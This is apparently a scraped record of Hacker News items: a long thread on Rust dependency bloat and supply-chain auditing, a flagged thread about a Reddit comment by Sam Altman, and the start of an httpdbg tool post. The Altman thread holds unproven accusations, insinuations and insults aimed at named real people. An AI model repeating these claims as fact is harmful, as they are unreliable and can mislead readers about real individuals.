data. Any data structure or string library could inject malicious data that will cross the boundaries and e.g. alter file paths or cause XSS. reply josephg 5 hours agorootparentprev> the exploits are impossible to write by accident, but they are possible to write on purpose. Can you give some examples? What ways are there to write safe rust code & do nasty things, affecting other parts of the binary? Is there any reason bugs like this in LLVM / rustc couldn't be, simply, fixed as they're found? reply steveklabnik 5 hours agorootparenthttps://github.com/Speykious/cve-rs They can be fixed, but as always, there’s a lot of work to do. The bug that the above package relies on has never been seen in the wild, only from handcrafted code to invoke it, and so is less of a priority than other things. And some fixes are harder than others. If a fix is going to be a lot of work, but is very obscure, it’s likely to exist for a long time. reply zifpanachr23 11 hours agorootparentprevBecause for a lot of companies, especially ones in industries that Rust is supposedly hoping to displace C and C++ in, dependencies are a much larger concern than memory safety. They slow down velocity way more than running massive amounts of static and dynamic analysis tools to detect memory issues does in C. Every dependency is going to need explicit approval. And frankly, most crates would never receive that approval given the typical quality of a lot of the small utility crates and other transitive dependencies. Not to mention, the amount of transitive dependencies and their size in a lot of popular crates makes them functionally unauditable. This more than any other issue is I think what prevents Rust adoption outside of more liberal w.r.t dependencies companies in big tech and web parts of the economy. This is actually one positive in my view behind the rather unwieldy process of using dependencies and building C/C++ projects. There's a much bigger culture of care and minimalism w.r.t. choosing to take on a dependency in open source projects. Fwiw, the capabilities feature described in the post would go a very long way towards alleviating this issue. reply umanwizard 10 hours agorootparentThose companies can just ban using new rust dependencies, if they want to. Writing with minimal dependencies is just as easy in rust as it is in c++ reply hu3 7 hours agorootparentYou can't \"just ban\" new dependencies in an ecosystem where they are so pervasive otherwise the ban becomes a roadblock to progress in no time. Sorry I have a problem with \"just\" word in tech. reply umanwizard 1 hour agorootparentIndeed, you wouldn't really be participating in the \"rust ecosystem\" at that point. I'm not disputing that it'd be a lot more difficult. The experience would be similar to using C++. reply kibwen 5 hours agorootparentprevThis appears to be implying that rolling your own libraries from scratch is not a roadblock in C and C++, but somehow would be in Rust. That's a double standard. Rust makes it easy to use third-party dependencies, and if you don't want to use third-party dependencies, then you're no worse off than in C. reply hu3 4 hours agorootparentOr, you know, leverage Go/.NET/JVM standard libraries for 99.999% of software and get shit done because there's more to memory safe solutions than just Rust. Not to mention C/C++ dependency situation is a low bar to clear. reply umanwizard 1 hour agorootparentIf you can tolerate a garbage collector and interpreter overhead, sure. Rust's main niche is things that would have formerly been written in C++. reply sandywaffles 5 hours agorootparentprevNo one is forcing you to use a dependency. Write the code yourself just like you would in another language. Or vendor the dependency and re-write/delete/whatever the code you don't like. reply hu3 4 hours agorootparentSorry but down here in Earth, not having unlimited resources and time does force us to use dependencies if you want to get things done. The line has to be drawn somewhere. And that line is much more reasonable when you can trust large trillion dollar backed standard libraries from the likes Go or .NET, in contrast to a fragmented ecosystem from other languages. What good is vendoring 4 million lines of code if I have to review them anyway at least once? I'd rather have a strong MSFT/GOOGL standard library which I can rely upon and not have to audit, thank you very much. reply anon-3988 11 hours agorootparentprevDoes C++ codebases with similar features parity somehow requires less code? reply leoedin 9 hours agorootparentThere's probably a similar amount of code in the execution path, but the Rust ecosystem reliance on dependencies means that you're pulling in vast amounts of code that doesn't make it to your final application. A C++ library author is much more likely to just implement a small feature themselves rather than look for another 3rd party library for it. Adding dependencies to your library is a more involved and manual process, so most authors would do it very selectively. Saying that - a C++ library might depend on Boost and its 14 million LOC. Obviously it's not all being included in the final binary. reply kibwen 5 hours agorootparent> A C++ library author is much more likely to just implement a small feature themselves rather than look for another 3rd party library for it. This is conflating Javascript and Rust. Unlike Javascript, Rust does not have a culture of \"microdependencies\". Crates that get pulled in tend to be providing quite a bit more than \"just a small feature\", and reimplementing them from scratch every time would be needlessly redundant and result in worse code overall. reply nullifidian 4 hours agorootparent>Rust does not have a culture of \"microdependencies\" It absolutely does by the C/C++ standards. Last time I checked the zed editor had 1000+ dependencies. That amount of crates usually results in at least 300-400 separately maintained projects by running 'cargo supply-chain'. This is an absurd number. reply goodpoint 8 hours agorootparentprevYes and by orders of magnitude. reply bobajeff 4 hours agorootparentprevI disagree i think avoiding dependencies is partly how we have these codebases like chromium's where you can't easily separate the functionally you want and deal with them as a library. That to me isn't minimalism. reply goodpoint 8 hours agorootparentprevThere's been many massive supply chain attacks happening. And people are still calling it \"obscure concerns\"... reply iforgotpassword 12 hours agoparentprevMaybe they can learn from the Javascript folks, I heard they're very good at this. reply pjmlp 11 hours agorootparentI think the interaction between both communities is exactly the reason of the current state. reply teaearlgraycold 11 hours agorootparentprevNot sure if you're serious and talking about tree-shaking - or joking and talking about left-pad. reply M4Luc 7 hours agorootparentprevThe Javascript folks are at least aware and self critical of this. In the Rust community it's sold as a great idea. reply wiseowise 11 hours agorootparentprevYes, unironically they’re now. Node has improved greatly in last two years. They always had native JSON support. Now have native test runner, watch, fetch, working on permission system à la deno, added WebSockets and working on native SQLite driver. All of this makes it a really attractive platform for prototyping which scales from hello world without any dependencies to production. Good luck experimenting with Rust without pulling half the internet with it. E: and they’re working on native TS support reply Denvercoder9 10 hours agorootparent> without any dependencies Nah, you still have those dependencies, they're just integrated in your interpreter. That has advantages (you're now only trusting a single source) and disadvantages (you always get all the goodies and the associated risks with that, even if you don't need them). reply wiseowise 9 hours agorootparentYou’re being pedantic for the sake of being pedantic. reply mseepgood 11 hours agorootparentprevNo, they are the worst perpetrators re dependency hell. reply moss2 11 hours agoparentprevSame problem with JavaScript's NPM. And Python's PIP. reply jwr 11 hours agorootparentThis isn't necessarily a language problem, though, more of a \"culture\" problem, I think. I write in Clojure and I take great pains to avoid introducing dependencies. Contrary to the popular mantra, I will sometimes implement functionality instead of using a library, when the functionality is simple, or when the intersection area with the application is large (e.g. the library doesn't bring as many benefits as just using a \"black box\"). I will work to reduce my dependencies, and I will also carefully check if a library isn't just simple \"glue code\" (for example, for underlying Java functionality). This approach can be used with any language, it just needs to be pervasive in the culture. reply josephg 8 hours agorootparent> This isn't necessarily a language problem, though, more of a \"culture\" problem, I think. Author here. We could make it a language problem by having the language sandbox dependencies by default. Seems like an easy win to me. Technical solutions are almost always easier to implement than social solutions. reply Ygg2 8 hours agorootparentEdit: replied to wrong person. reply josephg 6 hours agorootparentHuh? > It's throwing the baby and bathwater into lava. Is it really so controversial to want to be able to limit the access that utility crates like humansize or serde have to make arbitrary syscalls on my computer? Seems to me like we could get pretty far with just compile-time checks - and that would have no impact whatsoever on the compiled code (or its performance). I don't understand your criticism. reply Ygg2 4 hours agorootparentI thought you wanted to prevent transitive dependencies. For sandboxing crates, as JoshTriplett said it's another can of worms. reply orwin 10 hours agorootparentprevI think this is made easier with Clojure macro capacity. In general, if you have powerfull metaprogramming tools, you trade dependency complexity with peace of mind (I still have flashbacks of C++ templates when i talk about metaprogramming :/. Does this qualify for PTSD?). reply hawski 7 hours agoparentprevThe friction in C and C++ library ecosystem is sometimes a feature for this sole reason. Many libraries try to pull as little as possible and other things as optional. reply olalonde 10 hours agoparentprevWhy do you care how many lines of code the dependencies are? Compile time? Lack of disk space? reply ptsneves 6 hours agorootparentThink of the problem as a bill of materials. Knowing the origin and that all the components of a part are fit for purpose is important for some applications. If I am making a small greenhouse i can buy steel profiles and not care about what steel are they from. If I am building a house I actually want a specific standardized profile because my structure's calculations rely on that. My house will collapse if they dont. If I am building a jet engine part I want a specific alloy and all the component metals and foundry details, and will reject if the provenance is not known or suitable[1]. If i am doing my own small script for personal purposes I dont care much about packaging and libraries, just that it accomplishes my immediate task on my environment. If I have a small tetris application I also dont care much about libraries, or their reliability. If I have a business selling my application and I am liable for its performance and security I damn sure want to know all about my potential liabilities and mitigate them. [1] https://www.usatoday.com/story/travel/airline-news/2024/06/1... reply M4Luc 6 hours agorootparentprevSecurity and maintenance. That's what's so compelling about Go. The std lib is not a pleasure to use. Or esp. fast and featureful. But you can rely on it. You don't depend on 1000 strangers on the internet that might have abandoned their Rust crate for 3 years and nobody noticed. reply cmrdporcupine 10 hours agorootparentprevSome of us like to understand what's happening in the software we work on, and don't appreciate unnecessary complexity or unknown paths in the codebase that come through third party transitive dependencies. Some of us have licensing restrictions we have to adhere to. Some of us are very concerned about security and the potential problems of unaudited or unmoderated code that comes in through a long dependency chain. Hard learned lessons through years of dealing with this kind of thing: good software projects try to minimize the size of their impact crater. reply M4Luc 6 hours agoparentprevAnother example is Axum. Using Go, C#, Deno or Node you don't even need any third party provided more or less secure and maintained lib. It all comes from the core teams. reply dathinab 6 hours agoparentprev> It turns out, the deps add up to almost 4 million lines of Rust code, spread across 8000+ files (Putting aside the question weather or not that pulls in dev dependencies and that watchin files can easily have OS specific aspecects so you might have different dependencies on different OSes and that neither lines and even less files are a good measurement of complexity and that this dependencies involve a lot of code from features of dependencies which aren't used and due to rust being complied in a reasonable way are reliable not included in the final binary in most cases. Also ignoring that cargo-watch isn't implementing file watching itself it's in many aspects a wrapper around watchexec which makes it much \"thiner\" then it would be otherwise.) What if that is needed for a reliable robust ecosystem? I mean, I know, it sound absurd but give it some thought. I wouldn't want every library to reinvent the wheel again and again for all kinds of things, so I would want them to use dependencies, I also would want them to use robust, tested, mature and maintained dependencies. Naturally this applies transitively. But what libraries become \"robust, tested, mature and maintained\" such which just provide a small for you good enough subset of a functionality or such which support the full functionality making it usable for a wider range of use-case? And with that in mind let's look at cargo-watch. First it's a CLI tool, so with the points above in mind you would need a good choice of a CLI parser, so you use e.g. clap. But at this point you already are pulling in a _huge_ number of lines of code from which the majority will be dead code eliminated. Through you don't have much choice, you don't want to reinvent the wheel and for a CLI libary to be widely successful (often needed it to be long term tested, maintained and e.g. forked if the maintainers disappear etc.) it needs to cover all widely needed CLI libary features, not just the subset you use. Then you need to handle configs, so you include dotenvy. You have a desktop notification sending feature again not reason to reinvent that so you pull in rust-notify. Handling path in a cross platform manner has tricky edge cases so camino and shell-escape get pulled in. You do log warnings so log+stderrlog get pulled in, which for message coloring and similar pull in atty and termcolor even through they probably just need a small subset of atty. But again no reason to reinvent the wheel especially for things so iffy/bug prone as reliably tty handling across many different ttys. Lastly watching files is harder then it seems and the notify library already implements it so we use that, wait it's quite low level and there is watchexec which provides exactly the interface we need so we use that (and if we would not we still would use most or all of watchexecs dependencies). And ignoring watchexec (around which the discussion would become more complex) with the standards above you wouldn't want to reimplement the functionality of any of this libraries yourself it's not even about implementation effort but stuff like overlooking edge cases, maintainability etc. And while you definitely can make a point that in some aspects you can and maybe should reduce some dependnecies etc. this isn't IMHO changing the general conclusion: You need most of this dependencies if you want to conform with standards pointed out above. And tbh. I have seen way way way to many cases of projects shaving of dependencies, adding \"more compact wheel reinventions\" for their subset and then ran into all kinds of bugs half a year later. Sometimes leading to the partial reimplementations becoming bigger and bigger until they weren't much smaller then the original project. Don't get me wrong there definitely are cases of (things you use from) dependencies being too small to make it worth it (e.g. left pad) or more common it takes more time (short term) to find a good library and review it then to reimplement it yourself (but long term it's quite often a bad idea). So idk. the issue is transitive dependencies or too many dependencies like at all. BUT I think there are issues wrt. handling software supply chain aspects. But that is a different kind of problem with different solutions. And sure not having dependencies avoid that problem, somewhat, but it's just replacing it IMHO with a different as bad problem. reply wiseowise 12 hours agoparentprevWhat do you propose? To include it as part of std? Are you insane? That would bloat your binaries! (Still don’t understand how the smart compiler isn’t smart enough to remove dead code) And imagine if there’s an update that makes cargo-watch not BlAzInGlY fAsT™ but uLtRa BlAzInGlY fAsT™? /s reply willvarfar 11 hours agorootparentHow does Go compare? I'm curious as I don't know Go but it often gets mentioned here on HN as very lightweight. (A quick googling finds https://pkg.go.dev/search?q=watch which makes me think that it's not any different?) reply wiseowise 11 hours agorootparenthttps://pkg.go.dev/std They’re much better. reply lifthrasiir 10 hours agorootparentI recall that I was very surprised to hear that Go standard library has extensive cryptographic stuffs. Generally that would be very unwise because they will become much harder to change or remove in spite of security issues. Turns out that this particular portion would be maintained by other maintainers who are actually trained in cryptography and security---something almost any other languages wouldn't be able to do with their resources. reply TechDebtDevin 11 hours agoparentprevYou fuck around... reply armitron 11 hours agoparentprevThis is the main reason we have banned Rust across my Org. Every third party library needs to be audited before being introduced as a vendored dependency which is not easy to do with the bloated dependency chains that Cargo promotes. reply skywal_l 11 hours agorootparentThe dependency hell issue is not directly related to Rust. The Rust language can be used without using any dependency. Have you banned javascript and python too? reply Zagitta 7 hours agorootparentAnd in a similar vein have they audited the runtimes of all the languages they use? Because those a dependencies too and in many ways even more critical than libraries. reply OtomotO 11 hours agorootparentprevGood on you, this approach will keep you employed for a looooooooong time, because someone has to write all that code then, right? ;) reply mu53 11 hours agorootparentTBH, I have adjusted my programming recently to write more stuff myself instead of finding a library. Its not that bad. I think ChatGPT are really good at these at those types of questions since it can analyze multiple from github and give you an answer averaging them together. Also, if you just have a really well defined problem, its easy to just whip out 10-50 lines to solve the issue and be done with it reply SkiFire13 10 hours agorootparentAnd that's how you end up with solutions that don't handle edge cases. reply OtomotO 8 hours agorootparentprevAnything worth writing isn't covered by chatgpt reply j-krieger 11 hours agorootparentprevHow do you solve this for other languages you use? reply hu3 7 hours agorootparentI've seen this approach go a long way with languages that have a large standard library. Go and C# .NET comes to mind. reply armitron 11 hours agorootparentprevOur main languages are Go and OCaml. We can leverage third party libraries without easily running into transitive dependency hell as there’s an implicit understanding in these communities that large number of dependencies is not a good thing. Or, expressed differently, there is coarser granularity in what ends up being a library. This is not the case with Cargo which has decided to follow the NPM approach. reply lifthrasiir 11 hours agorootparentAt least in my experience, Go packages and Rust crates are much coarser than NPM packages. (Look at actual direct and indirect dependencies in cargo-watch to judge it by yourself.) I think Go prefers and actually has resource to keep mostly centralized approaches, while Rust crates are heavily distributed and it takes longer for the majority to settle on a single solution. reply simonask 11 hours agorootparentprevI'm sorry, but that feels like an incredibly poorly informed decision. One thing is to decide to vendor everything - that's your prerogative - but it's very likely that pulling everything in also pulls in tons of stuff that you aren't using, because recursively vendoring dependencies means you are also pulling in dev-dependencies, optional dependencies (including default-off features), and so on. For the things you do use, is it the number of crates that is the problem, or the amount of code? Because if the alternative is to develop it in-house, then... The alternative here is to include a lot of things in the standard library that doesn't belong there, because people seem to exclude standard libraries from their auditing, which is reasonable. Why is it not just as reasonable to exclude certain widespread ecosystem crates from auditing? reply cmrdporcupine 9 hours agorootparent> One thing is to decide to vendor everything - that's your prerogative - but it's very likely that pulling everything in also pulls in to",
    "originSummary": [
      "The Rust programming language, initially innovative with features like memory safety and a modern package manager, now appears stagnant with slow progress and many unstable features.",
      "The consensus process in Rust's development may be hindering its evolution, leading to extensive discussions that often result in dead ends, such as the unresolved Mutex improvement thread.",
      "The author proposes significant changes, including function traits, compile-time capabilities, and adopting Zig's comptime concept, which would likely require a new edition of Rust due to incompatibility with the existing version."
    ],
    "commentSummary": [
      "The discussion centers around the Rust programming language's RFC (Request for Comments) process and the balance between adding new features and maintaining simplicity.",
      "The author argues that while Rust's core team is cautious about adding new features to avoid complexity, some existing features like `Pin` are already difficult to use and understand, suggesting a need for better design.",
      "The debate highlights the tension between evolving a language to meet new needs and keeping it accessible and consistent for developers, with some features taking years to implement due to extensive deliberation."
    ],
    "points": 319,
    "commentCount": 346,
    "retryCount": 0,
    "time": 1727329020
  },
  {
    "id": 41657001,
    "title": "Sam Altman: Long con was \"child's play for me\"",
    "originLink": "https://old.reddit.com/r/AskReddit/comments/3cs78i/whats_the_best_long_con_you_ever_pulled/cszwpgq/",
    "originBody": "whoa there, pardner! Your request has been blocked due to a network policy. Try logging in or creating an account here to get back to browsing. If you're running a script or application, please register or sign in with your developer credentials here. Additionally make sure your User-Agent is not empty and is something unique and descriptive and try again. if you're supplying an alternate User-Agent string, try changing back to default as that can sometimes result in a block. You can read Reddit's Terms of Service here. if you think that we've incorrectly blocked you or you would like to discuss easier ways to get the data you want, please file a ticket here. when contacting us, please include your ip address which is: 20.55.15.17 and reddit account",
    "commentLink": "https://news.ycombinator.com/item?id=41657001",
    "commentBody": "[flagged] Sam Altman: Long con was \"child's play for me\" (reddit.com)216 points by upwardbound 7 hours agohidepastfavorite60 comments blibble 6 hours agoat this point it's beyond clear that assigning even the most cynical motives you can imagine to anything Altman does is likely underplaying what's really going on (in my opinion) reply tim333 1 hour agoparentIn fairness he did pretty well for everyone at Reddit seems. reply sixQuarks 6 hours agoparentprevAll 3 of the original founders have quit, this guy has sus written all over him reply neilv 6 hours agoprev> [flagged] Sam Altman: Long con was \"child's play for me\" (reddit.com) 160 points by upwardbound 1 hour ago...| 40 comments Incidentally, in the comments here, `upwardbound` had an interesting plausible take on this familiar link. https://news.ycombinator.com/item?id=41657334 reply asdfasdf1 4 hours agoprevDo not fall into the trap of anthropomorphizing Sam Altman reply fleaflicker 6 hours agoprevThat comment is clearly sarcastic. And Reddit went from floundering to $10b+ public company. reply sixQuarks 6 hours agoparentnext [2 more] [flagged] neilv 6 hours agorootparentWell, the username `fleaflicker` could fit an account that someone uses to respond to people who annoy them, and who they think are parasites and far beneath them. But it's not necessarily an alt of Altman. HN has a lot of people who'd say that, and a lot of people who'd like to smack those people and other people, and also the normal (old-school) Internet levels of trolling. reply haunter 5 hours agoprevOP you can link comments with context https://old.reddit.com/r/AskReddit/comments/3cs78i/whats_the... reply lcnPylGDnU4H9OF 5 hours agoparentThey did and the query parameters were removed from the URL. https://news.ycombinator.com/item?id=41657014 reply drchiu 6 hours agoprevTo play in SV, you have to study Game of Thrones, Art of War, etc. reply antupis 6 hours agoparentGenerally, these cloak-and-dagger companies just vanish especially industry where is fierce competition because cloak-and-dagger stuff takes just too much energy from the north start. I would not be surprised if 2025 GPT-5 still is not out and OpenAI just drops the whole model + number concept and just starts calling it to gpt. reply benterix 6 hours agorootparentCalling it GPT just like Apple calling it \"the iPad\" is something you can do when you basically have no competition. OpenAI faces competition from all sides so they need the numbering game for now. reply Y_Y 6 hours agoparentprevAltman, Ctrlman, Deleteman reply TZubiri 4 hours agorootparentInsightful reply squigz 6 hours agoparentprev4D chess, am I right? reply whamlastxmas 4 hours agoparentprevMust be smart enough to watch Rick and Morty reply 15155 6 hours agoparentprevSo, just like everywhere else, then? reply jajko 6 hours agoparentprevHate to break it to you, but this is how C suite looks like in every bigger company, you don't even need to go multinational or S&P 500. Now I am not saying everybody is exactly same, there is variation, but within the shades of grey. Same as politics - think about all the hard battles they had to fight for decades, how could a decent honest person not only survive that but also come out on top of all others? At the end, with right kind of eyes you can find pretty simple logic everywhere. reply JSDevOps 6 hours agoprevI don't understand. reply lazylion2 5 minutes agoparenthttps://old.reddit.com/r/AskReddit/comments/3cs78i/whats_the... with context reply lcnPylGDnU4H9OF 5 hours agoparentprevThere’s an explanation from the submitter in this comment section. https://news.ycombinator.com/item?id=41657334 reply teekert 6 hours agoparentprevHmm, yeah me neither, there are just comments? I hardly ever use reddit and often leave confused. reply meiraleal 5 hours agorootparentcomments made by the ex-CEO and Sam Altman reply teekert 3 hours agorootparentWith a lot of irrelevant stuff as decoration it seems. reply eterm 6 hours agoprevI don't know how much I believe this. One thing that successful people are often good at is taking their good luck and portraying it as a genius master-stroke of planning that no-one could have foreseen. Claiming to have actually engineered the string of leadership crises that engulfed Reddit is a bit far-fetched, and I suspect just bragging and taking credit for something that just happened. Did they ultimately benefit from those crises? Clearly, they were opportunistic. But actually engineering that as some kind of master-plan comes across to me as an attempt to puff up their ego. It comes across as sociopathic regardless of how much is fact or fiction. reply supriyo-biswas 6 hours agoparent> Claiming to have actually engineered the string of leadership crises that engulfed Reddit is a bit far-fetched. I've personally observed such engineered crises and the stakes were considerably smaller in these cases; if you have a sufficiently Machiavellian set of people at hand, you'll observe the kind of coups and tug of wars that you see here. reply sixQuarks 6 hours agoparentprevYou might actually be right reply tessierashpool9 4 hours agoprevcan someone provide context? who is sam responding to and why? reply lazylion2 4 minutes agoparenthttps://old.reddit.com/r/AskReddit/comments/3cs78i/whats_the... reply err4nt 3 hours agoparentprevIf you click the link under his message that says 'parent', you can see the comment he is replying to. I don't think there's a way to see both at once very easily because of the number of replies the parent comment has. reply qwertox 6 hours agoprevHow odd. Since yesterday I've bin thinking about him, that he might become the greatest con man of the century. Something along the lines, that, once OpenAI has archived AGI, he will keep it to himself in the sense that it will only be able to do what he wants us to be able to do with it, and to shape it so that it benefits him and only him. Then there's also the possibility that, if he starts to feel \"not liked\" by the population, that he'll go into full Elon Musk mode and use his power to become the greatest pal of Elon and Trump and use the tools to suppress what he doesn't like, as a retaliation for the lack of love. If you look at his interviews, he barely shows friendly emotions, as if he's got some empathy-problem. It could become quite dangerous. reply red-iron-pine 3 hours agoparent> It could become quite dangerous. once speculation has become this obvious it means it has already become dangerous. reply meiraleal 6 hours agoparentprevHe wants to be the next Mark Zuckerberg or Bill Gates. But all his endeavors have this feeling of him taking advantage of real hackers to steal the spotlight. Like, he is the smallest contributor for the success of ChatGPT but became the face of OpenAI globally. Not coincidentally, since many people more important than him left OpenAI, they lost the lead in LLMs development and Claude/Anthropic seems to be growing way faster. reply AnimalMuppet 3 hours agoparentprev> ... once OpenAI has archived AGI, he will keep it to himself in the sense that it will only be able to do what he wants us to be able to do with it, and to shape it so that it benefits him and only him. Once? Let's first worry about \"if\" rather than \"when\". But if it does... the thing about AGI is that it will decide for itself what it wants to do. It won't be controlled like that by Altman or anyone else. reply upwardbound 6 hours agoprevWith 144 points, this story suddenly went from being ~#12 on the front page to now being #70, on page 3. If any journalists or regulators are reading this I recommend that possible astroturfing behavior (collusive downvoting (flagging)) be investigated, and I'm happy to cooperate with any investigation if contacted. reply buran77 6 hours agoparentAs it happens with every discussion touching on sufficiently sensitive skin (\"offending\" some people, countries, etc.). One can't imagine that an article trashing a former president of Y Combinator will survive well especially on HN where burying any discussion in the \"flagged\" category is absolutely trivial. It doesn't mean the information in any of these articles is true or false, just that the mere existence of the discussion offends, so it's promptly pushed under the table through a voting system that is exceptionally ripe for abuse. reply meiraleal 6 hours agoparentprevIf you are really into it, write a blog post about the reddit thread (and the flagging of this thread?) and post here. reply upwardbound 6 hours agoparentprevNearly simultaneously, the comment in this thread which explains what Yishan was saying suddenly dropped from being the #1 comment to being below a bunch of other comments, which makes this whole thread harder to understand unless you scroll down. This is despite the comment having 17 points and high engagement. https://news.ycombinator.com/item?id=41657014 The fact that these two things which both benefit Sam happened simultaneously (the story dropping from the front page and the explanatory comment dropping from the top of the comments) is suggestive of collusive downvoting/flagging and once again I want to state that I have screenshots showing this playing out minute by minute and I am happy to collaborate with journalists or regulators. reply heavyheavy 2 hours agoprevDon't look into the rabbit hole of what he allegedly did to his sister. reply givinguflac 6 hours agoprevAltman? Manipulative, dishonest and generally a bad person? Gasp shocked I say. reply upwardbound 7 hours agoprevThread context: https://old.reddit.com/r/AskReddit/comments/3cs78i/whats_the... HN removes the \"?context=3\" when submitting the link as a post, which is why I have to put it here in a comment. Credit to dalant979 for surfacing this, which they did here: https://news.ycombinator.com/item?id=41652513 reply upwardbound 7 hours agoparentIf I understand the history correctly, Yishan (the former Reddit CEO) is talking about himself when he talks about a CEO in this story, and so Yishan's post is a brag, with a thin denial tacked on at the end. That's why I believe that Sam (Yishan's friend) is also engaging in thinly-veiled bragging about these events. Here is Yishan's comment with his name spelled out for clarity instead of just saying \"CEO\": In 2006, reddit was sold to Conde Nast. It was soon obvious to many that the sale had been premature, the site was unmanaged and under-resourced under the old-media giant who simply didn't understand it and could never realize its full potential, so the founders and their allies in Y-Combinator (where reddit had been born) hatched an audacious plan to re-extract reddit from the clutches of the 100-year-old media conglomerate. Together with Sam Altman, they recruited a young up-and-coming technology manager [named Yishan Wong] with social media credentials. Alexis, who was on the interview panel for the new reddit CEO, would reject all other candidates except this one. The manager was to insist as a condition of taking the job that Conde Nast would have to give up significant ownership of the company, first to employees by justifying the need for equity to be able to hire top talent, bringing in Silicon Valley insiders to help run the company. After continuing to grow the company, [Yishan Wong] would then further dilute Conde Nast's ownership by raising money from a syndicate of Silicon Valley investors led by Sam Altman, now the President of Y-Combinator itself, who in the process would take a seat on the board. Once this was done, [Yishan Wong] and his team would manufacture a series of otherwise-improbable leadership crises, forcing the new board to scramble to find a new CEO, allowing Altman to use his position on the board to advocate for the re-introduction of the old founders, installing them on the board and as CEO, thus returning the company to their control and relegating Conde Nast to a position as minority shareholder. JUST KIDDING. There's no way that could happen. -- yishanwong My understanding of what Sam meant by \"I could never have predicted the part where you resigned on the spot\" was that he was conveying respect for Yishan essentially out-playing Sam at the end (the two of them are friends) by distancing himself (Yishan) from the situation and any potential liability in order to leave Sam \"holding the bag\" of possible liability. reply aimazon 6 hours agorootparentWhat a great con! They conned Conde Nast into turning Conde Nast's (reported) $20 million investment into billions of dollars for Conde Nast. Sam Altman is a genius, Conde Nast are such fools! reply upwardbound 6 hours agorootparentDepriving any party of any portion of their free will & their right to voluntarily consent is still a con, even if it's for (ostensibly) their own benefit. There's a reason that informed consent is required for medical procedures, even lifesaving ones. Informed consent is the process in which a health care provider educates a patient about the risks, benefits, and alternatives of a given procedure or intervention. The patient must be competent to make a voluntary decision about whether to undergo the procedure or intervention. Informed consent is both an ethical and legal obligation of medical practitioners in the US and originates from the patient's right to direct what happens to their body. https://www.ncbi.nlm.nih.gov/books/NBK430827/ I know that it's a stretch to apply medical ethics to business deals but I believe the principle of informed consent is still a moral requirement. An example of how this is the intent in many legal systems is the concept of a \"meeting of the minds\" being a mandatory part any legally valid contract. \"Meeting of the minds\" is similar to the idea of informed consent: https://en.wikipedia.org/wiki/Meeting_of_the_minds reply aimazon 6 hours agorootparentYou're accepting that the \"con\" was a con. For the con to be a con (consensual or otherwise) we have to believe that Conde Nast were willing to give up their majority stake without knowing that it would lead to the company being worth billions. If they didn't think giving up their majority stake would benefit them, why did they do it? The entire premise of the con is that Conde Nast were simultaneously too stupid to realise that there was a path to success for reddit but also willing to give up their majority stake based on the need to hire some people? reply upwardbound 5 hours agorootparent> manufacture a series of otherwise-improbable leadership crises This was a violation of Yishan’s fiduciary duty to Condé Nast. It’s illegal. reply aimazon 5 hours agorootparentYou’re missing my point. I’m suggesting there was no con. The “manufacture[d] leadership crises” were not manufactured. Reddit was sold to Conde Nast, it struggled due to lack of investment, a plan was put forward to rescue it, Conde Nast consented to the plan. If Reddit was struggling due to underinvestment why would crises need to be manufactured? Everyone on Reddit back then recognised that it was a shit show due to underinvestment. Reddit continued to struggle for years after the “con” because it takes a long time to fix underlying issues, if the crises were manufactured, then a post-“con” reddit would have been wonderful and stable but it wasn’t. Altman and co. benefit from reframing the history of reddit as a grand genius conspiracy. reply awdwad 5 hours agorootparentprevThis is bordering on fraud no? SBF is in prison despite making good investments with his ill gotten funds. That does not make him less culpable. Sam Altman and his cadre are the distillation of everything wrong with the Valley. It would seem you need to be spineless to work with these people. reply lylejantzi3rd 6 hours agorootparentprevThat tracks. It could also explain why Ellen Pao was next in line, had a fairly brief stay before another \"leadership crisis\", and was subsequently replaced by Reddit cofounder Steve Huffman. reply immibis 6 hours agorootparentShe was the scapegoat CEO during the First Reddit Purge. reply phito 6 hours agorootparentprevThanks for clarifying, it was really confusing to read... reply thrdbndndn 6 hours agorootparentprevI don't quite understand the last paragraph. Why would Yishan the CEO manufacture crises and outed himself? Was he (at this point) an ally in Sam's con or victim? reply thrdbndndn 6 hours agorootparentprevWho is Alexis? reply phpnode 6 hours agorootparenthttps://en.wikipedia.org/wiki/Alexis_Ohanian reply falcor84 6 hours agorootparent> Ohanian is based in Florida, where he lives with his wife, former tennis player Serena Williams Oh, that Ohanian. It's a small world. reply upwardbound 7 hours agoprevnext [5 more] [flagged] upwardbound 7 hours agoparentAnother post which is on the front page with fewer points and older / more stale time is \"Writing Portable Rendering Code with Nvrhi\" with 5 points from 3 hours ago. To be clear, I do not believe that the HN moderators are doing anything wrong, but rather that Sam or his friends use a lot of accounts to flag anything bad about him, suppressing those posts. reply supriyo-biswas 6 hours agorootparentI did not downvote your post, but please also note the following from the HN guidelines: > Please don't post insinuations about astroturfing, shilling, brigading, foreign agents, and the like. It degrades discussion and is usually mistaken. If you're worried about abuse, email hn@ycombinator.com and we'll look at the data. reply meiraleal 7 hours agorootparentprevIt's on the front page right now, stop being this annoying and let people comment on the thread instead of being all over the place, geez. reply immibis 6 hours agorootparentAnd now it's [flagged] reply tiahura 6 hours agoprev [–] He may be the most rodent-like human I’ve ever observed. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "Sam Altman, a prominent tech figure, is being discussed on Reddit with mixed opinions about his motives and actions.",
      "Some users suggest Altman has been manipulative, while others argue he has significantly contributed to Reddit's success, transforming it into a multi-billion dollar company.",
      "The discussion includes references to former Reddit CEOs and the impact of leadership changes on the company's trajectory."
    ],
    "points": 216,
    "commentCount": 60,
    "retryCount": 0,
    "time": 1727349215
  },
  {
    "id": 41650905,
    "title": "Httpdbg – A tool to trace the HTTP requests sent by your Python code",
    "originLink": "https://github.com/cle-b/httpdbg",
    "originBody": "Hi,I created httpdbg, a tool for Python developers to easily debug HTTP(S) client requests in Python programs.I developed it because I needed a tool that could help me trace the HTTP requests sent by my tests back to the corresponding methods in our API client.The goal of this tool is to simplify the debugging process, so I designed it to be as simple as possible. It requires no external dependencies, no setup, no superuser privileges, and no code modifications.I&#x27;m sharing it with you today because I use it regularly, and it seems like others have found it useful too—so it might be helpful for you as well.Hope you will like it.cleSource: https:&#x2F;&#x2F;github.com&#x2F;cle-b&#x2F;httpdbgDocumentation: https:&#x2F;&#x2F;httpdbg.readthedocs.io&#x2F;A blog post on a use case: https:&#x2F;&#x2F;medium.com&#x2F;@cle-b&#x2F;trace-all-your-http-requests-in-py...",
    "commentLink": "https://news.ycombinator.com/item?id=41650905",
